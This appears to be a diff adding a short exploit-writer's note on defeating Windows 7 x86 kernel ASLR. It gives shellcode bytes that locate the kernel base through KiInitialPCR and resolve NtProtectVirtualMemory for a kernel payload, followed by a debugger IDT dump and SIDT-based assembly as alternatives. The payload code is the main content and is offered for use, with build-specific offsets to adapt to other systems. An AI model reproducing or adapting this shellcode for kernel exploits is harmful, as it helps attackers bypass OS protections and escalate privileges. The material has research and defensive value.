@@ -1,0 +1,60 @@
++----------------------------------------------------------------------+
+| Windows 7 x86's !nt scandown method on ring 0 ( kernel ASLR bypass ) |
++----------------------------------------------------------------------+
+
+[1] Summary
+When Writing Windows 7 Kernel Payload, kernel ASLR makes you hard to call nt!'s kernel api functions as 'NtProtectVirtualAddress()'
+I found another way of scandown the nt!'s base address on kernel ASLR implied systems. 
+
+nt!KiInitialPCR() API address is saved at [0x30]:[0x1c], then you can get the !nt's base address. 
+and also can resolving addresses of those api functions of !nt.
+
+nt! == 'C:\WINDOWS\system32\ntkrpamp.exe' ( NT Kernel & System )
+
+[2] testbed
+MS Windows 7 Enterprise K ( x86 ) on Vmware
+( 'K' maybe Korean edition? yeah... )
+
+[3] Assembly Codes
+[ 301C_nt_SCANDOWN.asm ] -------------------------------------------------------------------------
+"\x66\xbf\x30\x00" 		// mov di, 30h ; segment selector
+"\x66\x8e\xef"			// mov gs, di
+"\x65\x8b\x3d\x1c\x00\x00\x00"	// mov edi,dword ptr gs:[1Ch] ; nt!KiInitialPCR = [30h][1Ch]
+"\x81\xef\x00\x1c\x12\x00"	// sub edi, 121C00h ; base addr of nt!
+"\x81\xc7\xf9\xca\x23\x00"	// add edi, 23CAF9h ; file offset of NtProtectVirtualMemory
+
+; edi = nt!NtProtectVirtualMemory
+[ eoa ]-------------------------------------------------------------------------------------------
+
+p.s: i tested on '[2] testbed'. so you can apply it after changing those above offsets if you want to using on the other windows systems.
+
+Greets to Xpl017Elz, rebel
+
+[4] other general ways using gdt/idt
+--
+idtr base addr = 0x80b95400
+kd> dc 80b95400
+80b95400  00081570 [82c58e00] 00081700 82c58e00  p...............
+80b95410  00580000 00008500 00081b70 82c5ee00  ..X.....p.......
+80b95420  00081cf8 82c5ee00 00081e58 82c58e00  ........X.......
+80b95430  00081fcc 82c58e00 000825c8 82c58e00  .........%......
+80b95440  00500000 00008500 00082a28 82c58e00  ..P.....(*......
+80b95450  00082b4c 82c58e00 00082c8c 82c58e00  L+.......,......
+80b95460  00082eec 82c58e00 000831dc 82c58e00  .........1......
+80b95470  0008388c 82c58e00 00083c40 82c58e00  .8......@<......
+
+[ assembly codes ]
+0040B517     B8 0008DFFF    MOV EAX,FFDF0800
+0040B51C     0F0108         SIDT FWORD PTR DS:[EAX]
+0040B51F     8D58 04        LEA EBX,DWORD PTR DS:[EAX+4]
+0040B522     8B3B           MOV EDI,DWORD PTR DS:[EBX]
+--
+
+
+--
+nickname: x90c 
+email: geinblues@gmail.com
+personal hompage: http://www.x90c.org
+--
+
+
